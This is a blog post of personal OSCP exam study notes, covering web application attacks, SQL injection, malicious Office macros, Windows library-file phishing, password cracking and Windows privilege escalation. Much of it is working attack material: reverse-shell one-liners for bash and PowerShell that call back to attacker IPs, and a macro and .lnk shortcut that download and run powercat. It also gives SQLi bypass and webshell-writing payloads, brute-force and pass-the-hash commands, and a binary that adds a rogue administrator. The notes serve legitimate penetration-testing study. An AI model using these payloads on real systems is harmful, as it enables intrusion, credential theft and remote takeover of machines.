@@ -1,0 +1,846 @@
+---
+layout: post
+title: OSCP
+description: Personal notes/reference guide created while studying for the the OSCP exam.
+image: https://it-exams.net/wp-content/uploads/2023/04/OSCP-Certification.jpg
+tag: [hacking]
+---
+
+## Intro to Web Application Attacks
+- After discovering a web app, use Gobuster to enumerate files/directories exposed by the app. Use the “dir” mode to do this.
+	- gobuster needs a word list to aid enumeration. You’ll want the list to include “web words” like “js”. Use `/usr/share/wordlists/dirb/[common.txt/big.txt]`
+		- Example: `gobuster dir -w /usr/share/wordlists/dirb/common.txt -u "http://xxx.xxx.xxx.xxx/"`
+		- Example: `gobuster dir -w /usr/share/wfuzz/wordlist/general/megabeast.txt -u "http://xxx.xxx.xxx.xxx/" -p PATTERNFILE`
+			- In PATTERFILE, you could a put a pattern to get more control over what patterns are searched. For example, if you want to test API names but you know the URL for the API ends in a version number (which isn't uncommon), you could make a pattern file that contains the following:
+				```text
+				{GOBUSTER}/v1
+				{GOBUSTER}/v2
+				```
+		- NOTE: sometimes it appears that offsec VMs can run slow and gobuster will timeout if using the default timeout (12 seconds). Make it higher (such as 30s) with the `--timeout` option. Also note that to get help for params, use `gobuster dir -h` not `gobuster -h`.
+	- you can also use the `http-enum.nse` script
+		- see the [NSE script library](https://nmap.org/nsedoc/scripts/)
+		- Example: `nmap --script http-enum -p443 192.168.221.192`
+		- Enumerate word press site: `nmap -v -p <PORT> --script http-wordpress-enum --script-args search-limit="all",`
+- Tips for using `nmap`
+	- `-sV` is an important `nmap` option to remember; I guess you could say it stands for "scan version". It scans/probes open ports to determine the version
+- Determine the technology stack
+	- Wappalyzer can help you do this
+
+### CSRF Outline
+- Try finding a default URL
+	- wordpress example: `/wp-admin/admin.php`
+		- not sure if you can find an enumeration tool to find this. will probably be easier to use info gathered in earlier stages and use google to find default URLs for these pages
+	- try finding default creds online for the web application to the admin account
+- find vuln in a web page that doesn't perform good (or any) user input sanitization
+	- unclear to me how much of this step the user is expected to do. In the example, it just said "wordpress has a vuln at this spot in this file in the source code" - I'm going to guess that on the test I'll have to download source code I find online and look through it myself.
+- If questions on the test are like the lab, then you'll eventuall find that there's some aspect of web request that gets svaed tot the target (ie the user agent field in the http header). Test your they by sending a `<script>alert("test")</script>` to see if you can see this popup
+- craft a script that does something malicious
+	- see this section (Intro to Web Application Attacks) for examples
+		
+## Common Web Application Attacks
+
+### File Inclusion Vulnerabilities
+
+#### Local File Inclusion
+- Bash reverse one-liner: `bash -i >& /dev/tcp/192.168.119.3/4444 0>&1`
+
+#### PHP Wrappers
+- [Official docs for wrappers](https://www.php.net/manual/en/wrappers.php)
+- Wrappers enhance and expand php functionality
+	- For example, if you want to feed a remote file from an ftp server to your php script, you may give your php script this URL:
+		- `ftp://example.com/pub/file.txt`
+- How's this helpful for pentesters? Well, if a vulnerable webserver is using php to handle http requests, perhaps you can pass in a php wrapper in the URL of a request and get php to resolve the wrapper and return the result.
+- If there's a Local File Inclusion vulnerability on the webserver, this will be especially helpful because we can use wrappers to encode the result returned back to us, which is great if we want to see the contents of a php file on the webserver (and not have its contents be executed, thereby not getting returned to us)
+	- Example: say `example.com` uses `index.php` to process URLs in http requests from users. The server is vulnerable to a File Inclusion Vulnerability, and a pentester tries to exploit this to see the contents of `/var/www/html/target.php` by sending a request for the page at URL `http://example.com/index.php?page=../../../../../var/www/html/target.php`. This probably won't work, because the code in `target.php` will be executed and the results returned to the requester, no the actual contents of `target.php`. But if we use the [php://filter wrapper](https://www.php.net/manual/en/wrappers.php.php) `http://example.com/index.php?page=php://filter/convert.base64-encode/resource=../../../../../var/www/html/target.php` then the base 64 encoded contents of `target.php` will be returned to us.
+- NOTE: Remote File Inclusion (RFI) vulnerabilities are rare in the wild because a target system would have to specifically configured to allow it.
+
+#### Remote File Inclusion
+- If a web server is configured to interact with remote files, it may be susceptible to RFI exploitation
+- Kali has some php web shells that can be used for RFI: `/usr/share/webshells/php/`
+
+### File Upload Vulnerabilities
+### OS Command Injection
+- When encountering a web page that accepts user input commands:
+	- Play around to figure out what kind of sanitization it's doing; figure out how to run a command like "dir" or "ls"
+		- If on windows, use this command to determine if command is executed in cmd or powershell environment:
+		 
+			```text
+			(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell
+			```
+			
+			- If Powershell, you can use `powercat` at `/usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1` to create a reverse shell with netcat. To get it on the target, use this powershell command in the injection:
+				```
+				```
+			- That powershell will download powercat.ps1 from your computer (make sure to put your IP in there and start a python webserver in the same directory as `powercat.ps1` with `python3 -m http.server 80`, and also have a netcat listener running on port 4444). You'll have to URL encode it when you throw the replayed http request with Burp Suite or mitmproxy.
+
+## SQL Injection Attacks
+
+### SQL Theory and Databases
+
+#### DB Types and Characteristics
+
+- PEN-200 says that there are numerous types of databases, but this two of the most common that will be looked at in this course (and therefore you should learn for labs) are MySQL and Microsoft SQL Server (MSSQL).
+- Remember basic format of query: `SELECT <column(s)> FROM <table> WHERE <condition>`
+	- The condition is used to select rows from the columns. You can `=, <, <=, >=, >` and `<>` (which means "not equal")
+- MySQL
+	- Connect from linux box: `$ mysql -u root -p'root' -h 192.168.50.16 -P 3306`
+		- Note that the `-p` option is weird - make sure to use single quotes and no space between it and the `-p`
+	- Retrieve version of instance: `> select version();`
+	- Check current database user for the ongoing session: `> select system_user();`
+	- Collect list of all databases running in MySQL session: `> show databases;`
+	- Select/begin using a database:
+		- If database already selected: `> SHOW TABLES;`
+		- If database not yet selected: `> SHOW TABLES FROM database_name`
+	- Retrieve "user" and "authentication_string" vals from "user" table where "user" equals "offsec":
+		- `SELECT user, authentication_string FROM mysql.user WHERE user = 'offsec';`
+- MSSQL
+	- Connect to windows machine running MSSQL with [impacket](https://github.com/SecureAuthCorp/impacket):
+		- `impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth`
+			id:: 66044c02-a06c-4d8e-9b96-7c3e4c10b6ab
+	- Check MSSQL version AND the Windows OS version: `SELECT @@version;`
+	- List available databases: `SELECT name FROM sys.databases;`
+	- List tables from database 'offsec': `SELECT * FROM offsec.information_schema.tables;`
+
+### Manual SQL Exploitation
+#### Identifying SQLi via Error-based Payloads
+- Start by appending a special character to the data input field on a target website
+	- Think about how the underlying parsing may be happening, maybe something like:
+		```php
+		<?php
+		$uname = $_POST['uname'];
+		$passwd =$_POST['password'];
+		
+		$sql_query = "SELECT * FROM users WHERE user_name= '$uname' AND password='$passwd'";
+		$result = mysqli_query($con, $sql_query);
+		?>
+		```
+	- Appending an apostrophe or quotation is a good place to start.
+- If you can get an error, see if you can get a authentication bypass. For example, if you use this payload in the above code, then you can read all columns of data for the user "offsec" from the the `users` table: `offsec' OR 1=1 -- //`
+
+#### UNION-based Payloads
+- UNIONs enable the execution of an extra SELECT statement. For UNION SQLi to work:
+	- The injected UNION query has to include the same number of columns as the original query.
+	- The data types need to be compatible between each column.
+- So how do you craft a payload?
+	- Say a website is using our input to craft a query. We need to know exactly how many columns are in the table being queried. To determine this, we could try the SQLi `' ORDER BY 1--//` which will order the columns by the number we supply (eg `1`). If use the command to instruct the database to order by the Nth column when the table doesn't have that many columns, then we will get an error. Therefore, we can start with `' ORDER BY 1--//` and increment `1` until we get an error, thus informing us how many columns there are.
+	- Use some characters (not explained in detail by offsec) to conclude the first query, then `UNION`, then the second query:
+		- `%' UNION SELECT database(), user(), @@version, null, null --//`
+			- Note: `@@version` is the syntax tot get the version in MySQL
+			- You need to pad the query with `null`s to the number of columns in the target table (5 in this example)
+- Try enumerating the [MySQL information schema](https://dev.mysql.com/doc/refman/8.0/en/information-schema-introduction.html) to learn more about other table in the database. Example:
+	- `' union select null, table_name, column_name, table_schema, null from information_schema.columns where table_schema=database() -- //`
+
+#### Blind SQL Injections
+- These rely on interpreting the output from the web application after it queries and displays info form the database.
+	- Boolean-based SQLi example:
+		- `http://192.168.50.16/blindsqli.php?user=offsec' AND 1=1 -- //`
+	- time-based SQLi payload example:
+		- `http://192.168.50.16/blindsqli.php?user=offsec' AND IF (1=1, sleep(3),'false') -- //`
+
+### Manual and Automated Code Execution
+#### Manual Code Execution
+- MSSQL has [xp_cmdshell](https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver15) which takes a string and passes it to a command shell for execution. It is disabled by default, but can be enabled like so:
+	-
+		```
+		kali@kali:~$ impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth
+		Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
+		...
+		SQL> EXECUTE sp_configure 'show advanced options', 1;
+		[*] INFO(SQL01\SQLEXPRESS): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
+		SQL> RECONFIGURE;
+		SQL> EXECUTE sp_configure 'xp_cmdshell', 1;
+		[*] INFO(SQL01\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
+		SQL> RECONFIGURE;
+		```
+	- After configuring xp_cmdshell, we can start executing commands:
+		- `SQL> EXECUTE xp_cmdshell 'whoami';`
+- MySQL database variants don't offer a single function to escalate to RCE, but we can abuse the `SELECT INTO_OUTFILE` statement to write files on the web server.
+	- Note: For this attack to work, the file location must be writable to the OS user running the database software.
+	- Example: `' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //`
+		- This query is non-sensical and will probably result in an error, but perhaps not before the reverse shell snippet is written to the destination. If we can then access that file, we'll get the shell.
+		- NOTE: Remember to do some research to figure out where to place the file. For example, with MySQL, you'll probably access a file saved to `/var/www/html/tmp/webshell.php` at `http://xxx.xxx.xxx.xxx/tmp/webshell.php`
+
+#### Automating the Attack
+- [sqlmap](https://sqlmap.org/) can identify and exploit SQLi vulns against various database engines.
+- Examples:
+	- `sqlmap -u http://192.168.50.19/blindsqli.php?user=1 -p user`
+		- -u: URL
+		- -p: test parameter
+	- `sqlmap -u http://192.168.50.19/blindsqli.php?user=1 -p user --dump`
+		- Dump entire database
+		- Does this by taking advantage of time-based SQLi vulnerability, so the process of dumping the whole database is quite slow.
+	- `--os-shell` gives us an interactive database shell, but if it relies on blind time-based SQLi, it will be slow to use. Using this parameter with UNION-based SQLi affords a better user experience.
+	- `sqlmap -r post.txt -p item  --os-shell  --web-root "/var/www/html/tmp"`
+		- `-r`: post.txt contains a post request (saved using either Burp or mitmproxy)
+- **Q4 - Capstone Lab**
+	- The hint bot in discord gives the following hints. Sub bullets are my notes.
+	- 1) Visit the website and add alvida-eatery.org to your hosts file.
+	- 2) Analyze the site with tools like Wappalyzer or WhatWeb to identify the CMS (WordPress).
+		- Not strictly necessary to use an analyzer - after adding alvida-eatery.org to your /etc/hosts file and visiting the website, you'll see clues on the webpage that it is wordpress.
+	- 3) Use WPScan to enumerate plugins/themes, searching for known vulnerabilities.
+		- This is annoying that this is part of the solution because wpscan was not taught as part of the course up to this point.
+		- I used this wpscan command: `wpscan --url http://alvida-eatery.org --enumerate ap,at --plugins-detection aggressive --api-token <token>`
+		- I recommend piping the output to a file because there's a lot
+		- Reading through the output, you'll see there is a "Unauthenticated SLQ Injection" vuln in the Perfect Survey plugin. This one only stood out among the other vulns because this question is in the SQLi Attacks module. On the final offsec exam, I imagine it'd be good to make a list of the vulnerabilities that look most severe and start there.
+	- 4) Use the POC in https://wpscan.com/vulnerability/c1620905-7c31-4e62-80f5-1d9635be11ad/
+		- wpscan provides [this link](https://wpscan.com/vulnerability/c2f8e9b9-c044-4c45-8d17-e628e9cb5d59) in the output as a reference for the aforementioned vulnerability, which provides this information as a POC:
+		- Change the link from the POC on that page to `http` and replace the domain:
+			- `http://alvida-eatery.org/wp-admin/admin-ajax.php?action=get_question&question_id=1%20union%20select%201%2C1%2Cchar(116%2C101%2C120%2C116)%2Cuser_login%2Cuser_pass%2C0%2C0%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%20from%20wp_users`
+			- Throw that link in a browser or do a curl request to receive json. On first glance, this just looks like random html and not helpful. If you carefully scan it though, you'll find this:
+			-
+				```<input
+				- 5) By searching wordpress keywords in https://hashcat.net/wiki/doku.php?id=example_hashes, we will notice that wordpress hashes start with $P$ characters. You should take it into account when you are receiving the output.
+				- Using the command `./hashcat.exe -a 0 -m 400 offsec_10.3.2_Q4.hash rockyou.txt` I found the password to be `hulabaloo`
+				- Seems like at this point there are numerous ways to get the flag. I used msfconsole:
+				- ```
+				> use exploit/unix/webapp/wp_admin_shell_upload
+				> set username admin
+				> set password hulabaloo
+				> set rhosts alvida-eatery.org
+				> set lhost <my ip>
+				> set lport 4444
+				> run
+				```
+			- Note: if not sure what options to use for an exploit, enter `show options` after selecting the exploit with the `use` command
+			- This gave me a metasploit shell. For there I poked around till I found `flag.tx`
+		- Alternatively, it seems like another common strategy is to login to the admin portal located at the default wordpress location, then upload a "plugin" that contains a web reverse shell.
+- **Q5 - Capstone Lab**
+	- `nmap -p- -v -sV -sC -oN output.txt 192.168.203.48` revealed that there is mysql running on port 3306
+
+## Client-side Attacks
+
+### Target Reconnaissance
+- Use `exiftool` to find information about documents you find, especially pdf files.
+	- `exiftool -a -u <FILENAME>`
+
+### Exploiting Microsoft Office
+- If `rdesktop` is not working, use `xfreerdp` instead. Syntax: `xfreerdp /u:<USERNAME> /p:<PASSWORD> /v:<IP_ADDR>`
+
+#### Leveraging Microsoft Word Macros
+- To get reverse shell using word macro:
+- Create a .doc (won't work with .docx; I haven't researched why) file
+- Go to View > Macros and create a new macro
+- Start with this template:
+	```
+	Sub AutoOpen()
+		MyMacro
+	End Sub
+	
+	Sub Document_Open()
+		MyMacro
+	End Sub
+	
+	Sub MyMacro()
+		Dim Str As String
+	Str = "powershell.exe -nop -w hidden -enc B64_ENCODED_STR_HERE"
+		CreateObject("Wscript.Shell").Run Str
+	End Sub
+	```
+- Replace the B64 encoded string in `Str` with a command to download [powercat.ps1](https://github.com/besimorhino/powercat) and then run it in memory. This can be done with: `IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.119.2/powercat.ps1');powercat -c 192.168.119.2 -p 4444 -e powershell`
+	- NOTE: after changing the host/port to the correct values, make sure to use `pwsh` on kali linux (or powershell on a windows box) to encode the command. It will encode differently than other encoders (haven't figured out why yet).
+	- pwsh command to encode in b64:
+		- `$Text = 'IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.119.2/powercat.ps1');powercat -c 192.168.119.2 -p 4444 -e powershell'`
+		- `$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)`
+		- `$EncodedText =[Convert]::ToBase64String($Bytes)`
+		- `$EncodedText`
+### Abusing Windows Library Files
+
+#### Steps to Obtaining Code Execution via Windows Library Files
+- Create windows virtual container ( a .Library.ms file)
+	```xml
+	<?xml version="1.0" encoding="UTF-8"?>
+	<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
+	<name>@windows.storage.dll,-34582</name>
+	<version>6</version>
+	<isLibraryPinned>true</isLibraryPinned>
+	<iconReference>imageres.dll,-1003</iconReference>
+	<templateInfo>
+	<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
+	</templateInfo>
+	<searchConnectorDescriptionList>
+	<searchConnectorDescription>
+	<isDefaultSaveLocation>true</isDefaultSaveLocation>
+	<isSupported>false</isSupported>
+	<simpleLocation>
+	<url>http://XXX.XXX.XXX.XXX</url>
+	</simpleLocation>
+	</searchConnectorDescription>
+	</searchConnectorDescriptionList>
+	</libraryDescription>
+	```
+- create a wsgidav server to serve .lnk file shortcut file
+	- `pip install python3-wsgidav`
+	- In directory you want to serve: `wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root .`
+- Create a .lnk shortcut file that downloads powercat and runs a powercat command to callback to our computer and open a reverse shell
+	```text
+	powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://<LHOST>:<LPORT>/powercat.ps1');
+	powercat -c <LHOST> -p <NETCAT_PORT> -e powershell"
+	```
+- Set up a separate web server using python to serve powercat. Offsec said we're using a different file server other than wsgidav because wsgidav is read/write; some AV will not let a `.lnk` file download a file from a remote location that is read/write. We could make the wsgidav server read only, but it's nice to keep the write permissions so that once we get the remote shell, we can exfiltrate files from the target.
+	- `python3 -m http.server <PORT>`
+- Start a netcat listener on the port specified in the `.lnk` file
+- Get user to open `.Library.ms` file, then double click the `.lnk` file
+
+## Antivirus Evasion
+
+### AV Evasion in Practice
+
+- TODO: figure out what the powershell "execution policy" is and how it's at all significant if a user can simply turn it off.
+	- See execution policy for current user:
+		- `Get-ExecutionPolicy -Scope CurrentUser`
+	- Set execution policy for current user:
+		- `Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser`
+- To run a powershell script as a one liner, use a [python script](https://github.com/darkoperator/powershell_scripts/blob/master/ps_encoder.py) to base 64 encode the script.
+
+## Password Attacks
+- Example http form brute force with hydra:
+	- Helpful explanation of how to use hydra for forms: https://github.com/gnebbia/hydra_notes?tab=readme-ov-file#http-forms
+	- `hydra http-post-form -h`
+	- `hydra -l user -P /usr/share/wordlists/rockyou.txt http://192.168.200.201 http-post-form '/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid'`
+- Hydra rdp example:
+	- Use `-l/-p` if you know the username/password, or `-L/-P` to provide a username/password list
+		- `hydra -l admin-P /usr/share/wordlists/rockyou.txt rdp://192.168.209.227`
+	- very similar syntax for ssh brute force
+- If you can find a ssh key, use ssh2john to turn it into a hash that is crackable with hashcat or john.
+	- NOTE: sometimes hashcat doesn't support hashes such as what is output by `ssh2john id_rsa` in this case, use:
+		- `john --wordlist=/usr/share/wordlists/rockyou.txt --rules=sshRules ssh.hash`
+			- `sshRules` is a custom rule group that I added by putting the following at the end of
+				```
+				...
+				[List.Rules:sshRules]
+				c $1 $3 $7 $!
+				c $1 $3 $7 $@
+				c $1 $3 $7 $#
+				```
+				{: file="/etc/john/john.conf"}
+- Pass the hash mimikatz commands:
+	- **privilege::debug**, **token::elevate**, and **lsadump::sam**
+- Pass the hash impacket:
+	- `impacket-psexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212`
+	-
+		> The format is  
+		"LMHash:NTHash", in which we specify the Administrator NTLM hash after  
+		the colon. Since we only use the NTLM hash, we can fill the LMHash  
+		section with 32 0's.  
+
+### Working With Password Hashes
+- [Powershell reverse shell one-liner](https://gist.github.com/egre55/c058744a4240af6515eb32b2d33fbed3):
+	```powershell
+	$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex ". { $data } 2>&1" | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+	```
+- When base64 encoding commands for use with the `-enc` flag in powershell, make sure you encode Unicode text:
+	```bash
+	kali@kali:~$ pwsh
+	PowerShell 7.1.3
+	Copyright (c) Microsoft Corporation.
+	https://aka.ms/powershell
+	Type 'help' to get help.
+	
+	PS> $Text = '$client = New-Object
+	System.Net.Sockets.TCPClient("192.168.119.3",4444);$stream =
+	$client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0,
+	$bytes.Length)) -ne 0){;$data = (New-Object -TypeName
+	System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-
+	String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte =
+	([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Leng
+	th);$stream.Flush()};$client.Close()'
+	
+	PS> $Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
+	
+	PS> $EncodedText =[Convert]::ToBase64String($Bytes)
+	
+	PS> $EncodedText
+	JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAF
+	MAbwBjAGsAZQB0
+	...
+	AYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjA
+	GwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA
+	```
+
+## Windows Privilege Escalation
+
+### Enumerating Windows
+
+- There's four security control mechanisms this section covers
+- [Security Identifier](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/security-identifiers) (SID)
+	- Unique value assigned to each "principal" that can be authenticated by Windows, such as users and groups.
+	- SID for local accounts and groups is generated by the Local Security Authority (LSA)
+	- SID for domain users and domain groups is generated on a Domain Controller (DC)
+	- The SID cannot be changed and is generated when the user or group is created.
+	- Structure of SID is `S-R-X-Y`
+		- S: is literally an 'S', indicating the string is a SID
+		- R: Revision. Will always be `1`, unless the SID structure is revised in the future.
+		- X: Identifier authority. Indicates the authority that issues the SID. For example, "5" is the most common and specifies the NT Authority.
+		- Y: sub authorities of the identifier authority.
+		- Example: `S-1-5-21-1336799502-1441772794-948155058-1001`
+- [Access token](https://docs.microsoft.com/en-us/windows/win32/secauthz/access-tokens)
+	- Contains various pieces of info that effectively describe the *security context* of a user, or the rules/attributes that are currently in effect for that user.
+		- The security context consists of the user's SID, SIDs of the groups that user is a member of, the user and group privileges, and further info describing the scope of the token.
+		- *primary tokens* are assigned to processes or thread started by users, and they specify that processes'/thread's permissions.
+			- Threads can also have [impersonation tokens](https://docs.microsoft.com/en-us/windows/win32/secauthz/impersonation-tokens) which provide a different security context than the process that own the thread.
+- [Mandatory Integrity Control](https://docs.microsoft.com/en-us/windows/win32/secauthz/mandatory-integrity-control)
+	- When a process is started or object created, it receives the integrity level of the principal performing the operation.
+	- From Vista onward, there are 5 integrity levels:
+		- System: SYSTEM (kernel, ...)
+		- High: Elevated users
+		- Medium: Standard users
+		- Low: Very restricted rights often used in sandboxed[^privesc_win_sandbox] processes or for directories storing temporary data
+		- Untrusted: Lowest integrity level with extremely limited access rights for processes or objects that pose the most potential risk
+	- Process Explorer (or [NtObjectManager](https://github.com/googleprojectzero/sandbox-attacksurface-analysis-tools/blob/main/NtObjectManager/NtTokenFunctions.ps1) can be used to see integrity level of current user.
+	- The PowerShell processes have the integrity level of *High* and *Medium*
+- [User Account Control](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-overview) (UAC)\
+	- protects the operating system by running most applications and tasks with standard user privileges, even if the user launching them is an Administrator
+	- Hence, an administrator user receives two access tokens after a successful logon; first token is a standard user token (or a *filtered admin token*), which performs all non-privileged operations. The second token is a regular administrator token for privileged operations. To use this token, the [UAC consent prompt](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) needs to be confirmed
+		id:: 668d5bfe-ebb5-4bb5-afdd-5c86ac754b46
+- Good pentesting practice: always obtain the following info:
+	- Username and hostname
+		- `whoami`
+	- Group memberships of the current user
+		- `whoami /groups`
+	- Existing users and groups
+		- Enumerate users:
+			- [net user](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc771865(v=ws.11)) command
+			- powershell: `Get-LocalUser`
+		- Enumerate groups:
+			- powershell: `Get-LocalGroup`
+			- powershell: `net localgroup`
+	- Operating system, version and architecture
+		- powershell: `systeminfo`
+	- Network information
+		- Goal is to identify all network interfaces, routes, and active network connections
+		- `ipconfig /all`
+		- always check the routing table on a target system to ensure we don't miss any information
+			- get all routes of the system: `route print`
+		- list all active network connections: `netstat -ano`
+	- Installed applications
+		- We can query to registry keys to list both 32-bit and 64-bit applications in the `Windows Registry`; pipe the output to **select** with the argument
+			**displayname** to only display the application's names:  
+			- 32 bit: `Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname`
+			- 64 bit: `Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname`
+			- The list from these queries could be incomplete or inaccurate, so always double check by checking the 32 bit and 64 bit **Program Files** directories in the **C** drive. Also, review contents of the **Downloads** directory of the user.
+	- Running processes
+		- Get a list of all running processes: `Get-Process`
+- Recursively search the whole C drive for .kdbx files in powershell:
+	- `Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue`
+	- You can also search for multiple kinds of files at once:
+		- `Get-ChildItem -Path C:\Users\<USER> -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue`
+- Every time you get access to a new user, repeat the process of looking for files containing info hidden in plain view.
+- Run cmd prompt as a different user:
+	- `runas /user:<USER> cmd`
+
+> Tip: If `runas` isn't working but you have access to the GUI, try just running the powershell prompt as administrator and logging in with admin creds 
+{: .prompt-tip}
+
+- Powershell logs
+	- Get list of commands executed in the past: `Get-History`
+		- Will not show commands if past user used `Clear-History`
+	- Get path of history files from PSReadline (a module added in Powershell v5 that records history in a way *not* cleared by `Clear-History`):
+		- `(Get-PSReadlineOption).HistorySavePath`
+	- [Enter-PSSession](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/enter-pssession?view=powershell-7.2) - like ssh, but for a windows machine to get a remote powershell on another windows machine.
+		- You can also use this command to do something similar to `runas`; you can use it to start a powershell session on the same computer running the command but as a different user. However, if you are using a bind shell, the output may be messed up. It's probably better to use evil-winrm in this case to the connect to the target (not sure what port needs to be open for this to work):
+			- `evil-winrm -i XXX.XXX.XXX.XXX -u USERNAME -p "PASSWORD"`
+	- "PowerShell artifacts such as the history file of PSReadline or transcript files are often a treasure trove of valuable information. We should never skip reviewing them, because most Administrators clear their history with Clear-History and therefore, the PSReadline history stays untouched for us to analyze. Administrators can prevent PSReadline from recording commands by setting the *-HistorySaveStyle* option to *SaveNothing* with the
+		[Set-PSReadlineOption](https://portal.offsec.com/courses/pen-200-44065/learning/windows-privilege-escalation-45276/enumerating-windows-47207/information-goldmine-powershell-45277#fn-local_id_465-13) Cmdlet. Alternatively, they can clear the history file manually."  
+		
+#### Automated Enumeration
+- Use [peass](https://www.kali.org/tools/peass-ng/)
+- On the target, copy the remote peas target to the local target using the [iwr](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-webrequest?view=powershell-7.2) cmdlet:
+	```bash
+	$ cp /usr/share/peass/winpeas/winPEASx64.exe .
+	$ python3 -m http.server 80
+	
+	# different terminal
+	$ nc 192.168.50.220 4444
+
+	# differernt terminal
+	> powershell
+	> iwr -uri http://192.168.118.2/winPEASx64.exe -Outfile winPEAS.exe
+	```
+### Leveraging Windows Services
+
+#### Service Binary Hijacking
+
+- If a service is not secured during installation and allows full read/write access to all members of the Users group, we can abuse this and replace the program with our own program. Then when our program is executed, it will be executed with the permissions of the service.
+- To get a list of windows services, we can use various methods:
+	- GUID snap-in *services.msc*
+	- `Get-Service` cmdlet
+	- `get-CimInstance` cmdlet (which supersedes the `Get-WmiObject` cmdlet)
+		- We are interested in the name, state, and path of the binaries for each service and therefore, use **Select** with the arguments **Name**, **State**, and **PathName**. In addition, we filter out any services that are not in a **Running** state by using **Where-Object**.
+		- `Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}`
+- Next, get permissions of the service binaries you identified in the previous step using `icacls` or [Get-ACL](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.security/get-acl?view=powershell-7.2)
+	- eg: `icacls "C:\xampp\apache\bin\httpd.exe"`
+	- `icacls` uses these symbols/masks to represent different permssions:
+		- F - Full access
+		- M - Modify access
+		- RX - Read and execute access
+		- R - Read-only access
+		- W - Write-only access
+	- Create your own binary to use on the target, eg:
+		```c
+		// compile with 'x86_64-w64-mingw32-gcc adduser.c -o adduser.exe'
+		#include <stdlib.h>
+		int main () {
+			int i;
+			i = system ("net user dave2 password123! /add");
+			i = system ("net localgroup administrators dave2 /add");
+			return 0;
+		}
+		```
+	- Send the binary to the target using `iwr` or some other means
+		- eg: `iwr -uri http://xxx.xxx.xxx.xxx/myCustomBin.exe -Outfile myCustomBin.exe`
+	- Try restarting the service using `net stop SERVICENAME`. If that doesn't work, use `Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'SERVICENAME'}` to check if the service's **StartMode** is **Auto**, in which case we could try to shutdown the system. We can check our privilege to shutdown to the system (among other privileges) with `whoami /priv`
+	- Flow for these challenges:
+		- Get a list of all installed and Running Windows service
+		- Determine if there are any services were installed/are running in a directory other than `C:\Windows\System32`
+		- Once identified, enumerate the permissions on those service binaries
+		- Determine if there are any service binaries with permissions share by a user that you have access to; if so, replace the service binary with a custom binary (being sure to save the original binary in a location you can restore it from if necessary)
+		- Try restarting the service. If you don't have permissions to do this, check the *StartMode* of the service binary; if it is *Auto* and your user has permission to restart the machine (`whoami /priv`), then restart the machine to trigger execution of the custom binary
+		- This process can be automated using [PowerUp](https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc)
+		
+
+#### Service DLL Hijacking
+
+#### Unquoted Service Paths
+
+### Abusing Other Windows Components
+
+## Port Redirection and SSH Tunneling
+
+If you have a shell but need a tty (in order to do ssh), try `python3 -c 'import pty; pty.spawn("/bin/sh")'`
+
+> Lowering the tcp_read_time_out and tcp_connect_time_out values in the Proxychains configuration file will force Proxychains to time-out on non-responsive connections more quickly.
+
+Start an ssh server on kali box:
+`sudo systemctl start ssh`
+
